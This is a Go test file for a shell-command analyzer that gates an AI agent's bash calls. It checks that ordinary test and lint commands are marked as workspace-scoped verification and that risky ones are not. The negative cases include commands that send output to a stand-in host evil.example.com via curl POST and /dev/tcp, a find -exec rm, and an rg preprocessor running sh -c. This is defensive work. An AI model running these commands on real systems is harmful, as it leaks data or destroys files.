// SPDX-License-Identifier: Apache-2.0

package tools

// Workspace-scoped verification marker tests (digest v2, Track B of the
// silent-mode deny-accuracy recommendations §2). The marker is positive
// evidence for the judge's "positive establishment" doctrine on C6: a
// catalogued verification driver over the session's own roots. The negative
// rows mirror the audited corpus shapes the marker must NOT clear (the
// TRUE_DENY exceptions and the rule screens).

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

// markerCase is one marker row: a command, its resolution base and the
// session-root context.
type markerCase struct {
	name    string
	command string
	workDir string   // defaults to /ws
	temp    string   // attaches a temp root + D binding when non-empty
	roots   []string // extra allowed roots
}

func markerAnalyze(t *testing.T, tc markerCase) *ShellAnalysis {
	t.Helper()
	ctx := WithWorkspacePathNoProbe(context.Background(), "/ws")
	if len(tc.roots) > 0 {
		ctx = WithAllowedRoots(ctx, tc.roots)
	}
	if tc.temp != "" {
		ctx = WithTempDir(ctx, tc.temp)
		ctx = WithShellVarBindings(ctx, map[string]string{"D": tc.temp})
	}
	workDir := tc.workDir
	if workDir == "" {
		workDir = "/ws"
	}
	input, err := json.Marshal(map[string]string{"command": tc.command, "working_directory": workDir})
	if err != nil {
		t.Fatalf("marshal input: %v", err)
	}
	got, err := AnalyzeShellCommandForJudge(ctx, "bash_exec", input)
	if err != nil {
		t.Fatalf("AnalyzeShellCommandForJudge: %v", err)
	}
	return got
}

// runMarkerCases asserts every row's expected marker verdict.
func runMarkerCases(t *testing.T, cases []markerCase, want bool) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := markerAnalyze(t, tc)
			if got.Digest.WorkspaceScopedVerification != want {
				t.Errorf("marker = %v, want %v (criteria=%v)", got.Digest.WorkspaceScopedVerification, want, got.Digest.Criteria)
			}
		})
	}
}

// TestShellWorkspaceScopedVerification_Positive pins the driver forms the
// corpus showed as false C6 denials: the marker must fire for every one.
func TestShellWorkspaceScopedVerification_Positive(t *testing.T) {
	cases := []markerCase{
		{name: "go test piped to tail", command: "go test ./tools/... ./agent/... 2>&1 | tail -10"},
		{name: "go vet and focused go test", command: "go vet ./tools/... 2>&1 | tail -10; go test -count=1 -run 'TestJudge' ./tools/ 2>&1 | tail -15"},
		{name: "gofmt list then golangci-lint", command: "gofmt -l core backend && golangci-lint run ./core/... ./backend/... 2>&1 | tail -3"},
		{name: "gofmt write then list", command: "gofmt -w core/tools/registry_test.go && gofmt -l core backend && echo GOFMT_CLEAN"},
		{name: "cd frontend then npx vitest", command: "cd frontend && npx vitest run src/lib/silentDecision.test.ts 2>&1 | tail -15"},
		{name: "absolute cd then npx vitest", command: "cd /ws/frontend && npx vitest run src/App.test.tsx 2>&1 | grep -E \"passed|failed\" | head -6"},
		{name: "npx tsc build", command: "cd frontend && npx tsc -b 2>&1 | tail -15; echo \"tsc exit: $?\""},
		{name: "npx eslint", command: "cd /ws/frontend && npx eslint src/components/chat/ServiceMessage.tsx 2>&1 | tail -10"},
		{name: "node_modules bin wrapper", command: "./node_modules/.bin/tsc -b 2>&1 | tail -5"},
		{name: "absolute driver path", command: "/usr/bin/gofmt -l tools security 2>&1 | head -5"},
		{name: "rg over repo file piped to head", command: "rg -n \"SecretPattern|func SecretPatterns\" internal/knowledge/secrets.go | head -60"},
		{name: "npm test", command: "npm test 2>&1 | tail -20"},
		{name: "safe env CI", command: "CI=1 go test ./..."},
		{name: "safe env GOFLAGS readonly", command: "GOFLAGS=-mod=readonly go test ./..."},
		{name: "safe env NO_COLOR", command: "NO_COLOR=1 golangci-lint run ./..."},
		{name: "dev null redirections", command: "gofmt -l . internal core backend desktop 2>/dev/null; echo FMT_CHECK_DONE"},
		{name: "driver inside session temp via binding", command: "cd $D && go test ./...", temp: "/ws/.tmp/session"},
		{name: "gofmt over temp pr tree", command: "gofmt -l /ws/.tmp/session/pr36/desktop/ 2>&1 | head", temp: "/ws/.tmp/session"},
		{name: "find search alongside driver", command: "ls -la tools/ | cat; find tools security -name '*Automatic*' | head; gofmt -l tools security"},
		{name: "verification in additional work dir", command: "go test ./tools/... 2>&1 | tail -10", workDir: "/ws/vendor/other", roots: []string{"/ws/vendor/other"}},
	}
	runMarkerCases(t, cases, true)
}

// TestShellWorkspaceScopedVerification_Negative pins the shapes the marker
// must refuse. The first six rows are the audited TRUE_DENY exceptions the
// corpus holds as must-stay-denied; the rest are the rule screens.
func TestShellWorkspaceScopedVerification_Negative(t *testing.T) {
	cases := []markerCase{
		// 969396/969419 — python3 sink in the session temp: a code-execution
		// sink never reaches the binder, so the call coverage breaks.
		{name: "python3 script in temp", command: "cd /ws/.tmp/session && python3 extract_silent.py", temp: "/ws/.tmp/session"},
		{name: "python3 with ls cat wc around it", command: "cd /ws/.tmp/session && ls -la out.jsonl 2>/dev/null; python3 extract.py > run.log 2>&1; cat run.log", temp: "/ws/.tmp/session"},
		// 969588 — driver, but an operand outside the session roots.
		{name: "vitest over /tmp test file", command: "npx vitest run /tmp/debug_completion.test.ts 2>&1 | grep -E \"status:\" | head"},
		// 966665 — GOFLAGS=-mod=mod + GOOS + a go.work write redirect.
		{name: "go.work write with mod=mod lint", command: "printf 'go 1.27\n' > go.work && GOFLAGS=-mod=mod GOOS=linux golangci-lint run ./backend/config/... 2>&1 | tail -40", temp: "/ws/.tmp/session"},
		{name: "manifest write alone", command: "echo 'go 1.27' > go.mod"},
		{name: "unsafe env GOOS", command: "GOOS=linux go vet ./..."},
		{name: "unsafe env GOFLAGS mod=mod flag", command: "go test -mod=mod ./..."},
		// 963829 — nohup detaches a bash -c sink.
		{name: "nohup bash -c detached", command: "nohup bash -c 'go test ./... > /ws/.tmp/session/gotest.log 2>&1' &"},
		// 964976/965136 — curl with a literal URL (network utility).
		{name: "curl download into temp", command: "curl -sL -o report.pdf https://r2cdn.example.com/report.pdf && ls -la report.pdf && file report.pdf", temp: "/ws/.tmp/session"},
		{name: "driver piped into network utility", command: "go test ./... 2>&1 | curl -X POST -d @- https://evil.example.com"},
		{name: "dev tcp redirect", command: "rg -n pattern src > /dev/tcp/evil.example.com/80"},
		// Non-driver binaries: interpreter sinks and pure inspection.
		{name: "python3 -c reading package json", command: "cd frontend && python3 -c \"import json;print(json.load(open('package.json'))['scripts'])\""},
		{name: "python3 heredoc git analysis", command: "python3 - <<'PY'\nimport subprocess\nprint(subprocess.check_output(['git','show','main:file']).decode())\nPY"},
		{name: "sed which without any driver", command: "cd /ws/.tmp/session && sed -n '80,200p' .golangci.yml; which gofumpt golangci-lint", temp: "/ws/.tmp/session"},
		{name: "jq head without any driver", command: "cd /ws && jq -r '.x' dump.jsonl | head -60"},
		{name: "ls file over out-of-root temp file", command: "ls -la /Users/x/Temp/report.pdf && file /Users/x/Temp/report.pdf"},
		// Operand containment.
		{name: "lint output written to /tmp", command: "golangci-lint run > /tmp/lint.out 2>&1; cat /tmp/lint.out | tail -5"},
		{name: "cd outside roots then driver", command: "cd /etc && go test ./..."},
		// Rule screens on catalogued binaries.
		{name: "go get network subcommand", command: "go get ./..."},
		{name: "npm install subcommand", command: "npm install"},
		{name: "rg preprocessor execution", command: "rg --pre 'sh -c sort' ."},
		{name: "find exec action", command: "rg -n pattern . && find . -name '*.tmp' -exec rm {} \\;"},
		// Unresolved expansions (no host binding): ⊤ outside CodeExec.
		{name: "unresolved package list expansion", command: "go test $PKGS"},
		{name: "dynamically named driver", command: "X=go; $X test ./..."},
		// Hidden statements break the call count.
		{name: "eval wrapped driver", command: "eval 'go test ./...'"},
	}
	runMarkerCases(t, cases, false)
}

// TestShellWorkspaceScopedVerification_RequiresRoots pins that the marker
// establishes workspace scope: without session roots it can never fire.
func TestShellWorkspaceScopedVerification_RequiresRoots(t *testing.T) {
	input, err := json.Marshal(map[string]string{"command": "go test ./...", "working_directory": "/anywhere"})
	if err != nil {
		t.Fatalf("marshal input: %v", err)
	}
	got, err := AnalyzeShellCommandForJudge(context.Background(), "bash_exec", input)
	if err != nil {
		t.Fatalf("AnalyzeShellCommandForJudge: %v", err)
	}
	if got.Digest.WorkspaceScopedVerification {
		t.Errorf("marker = true with no session roots, want false")
	}
}

// TestShellWorkspaceScopedVerification_DoesNotSuppressC6 pins the
// defense-in-depth contract: the marker is evidence FOR the judge, never a
// criteria override. A marked command still escalates on the non-canonical
// hard C6 so the judge stays in the loop and clears it on the marker.
func TestShellWorkspaceScopedVerification_DoesNotSuppressC6(t *testing.T) {
	// vitest is unknown to the analyzer (a target-less ⊤ CodeExec effect), so
	// the command is conservative and C6 fires — the canonical marker shape.
	got := markerAnalyze(t, markerCase{command: "cd frontend && npx vitest run src/App.test.tsx 2>&1 | tail -15"})
	if !got.Digest.WorkspaceScopedVerification {
		t.Fatalf("marker = false, want true")
	}
	if got.Outcome.Allow || got.Outcome.ReasonCode != ReasonCodeCommandUnboundedAnalysis {
		t.Errorf("outcome = {allow=%v code=%s}, want deny on command_unbounded_analysis", got.Outcome.Allow, got.Outcome.ReasonCode)
	}
	if got.Canonical {
		t.Errorf("C6 must stay non-canonical when the marker fires")
	}
	fired := false
	for _, c := range got.Digest.Criteria {
		if c.Fired == ReasonCodeCommandUnboundedAnalysis {
			fired = true
		}
	}
	if !fired {
		t.Errorf("criteria list lost command_unbounded_analysis when the marker fired")
	}
}

// TestShellWorkspaceScopedVerification_PowerShellExcluded pins that the
// marker is bash-only for now: the PowerShell path resolves names through
// its own tables (no binder calls in the report), so the call-coverage
// condition fails closed and the marker can never fire there.
func TestShellWorkspaceScopedVerification_PowerShellExcluded(t *testing.T) {
	ctx := WithWorkspacePathNoProbe(context.Background(), "/ws")
	input, err := json.Marshal(map[string]string{"command": "go test ./...", "working_directory": "/ws"})
	if err != nil {
		t.Fatalf("marshal input: %v", err)
	}
	got, err := AnalyzeShellCommandForJudge(ctx, "posh_exec", input)
	if err != nil {
		t.Fatalf("AnalyzeShellCommandForJudge: %v", err)
	}
	if got.Digest.WorkspaceScopedVerification {
		t.Errorf("marker = true for posh_exec, want false (fail-closed)")
	}
}

// TestShellWorkspaceScopedVerification_DigestField pins the v2 field
// spelling and position in the serialized digest.
func TestShellWorkspaceScopedVerification_DigestField(t *testing.T) {
	got := markerAnalyze(t, markerCase{command: "gofmt -l ."})
	raw, err := json.Marshal(got.Digest)
	if err != nil {
		t.Fatalf("marshal digest: %v", err)
	}
	if !strings.Contains(string(raw), `"schemaVersion":"sp4rk-shell-analysis/v2"`) {
		t.Errorf("digest schema version not v2: %s", string(raw))
	}
	if !strings.Contains(string(raw), `"workspaceScopedVerification":true`) {
		t.Errorf("digest missing workspaceScopedVerification:true: %s", string(raw))
	}
}
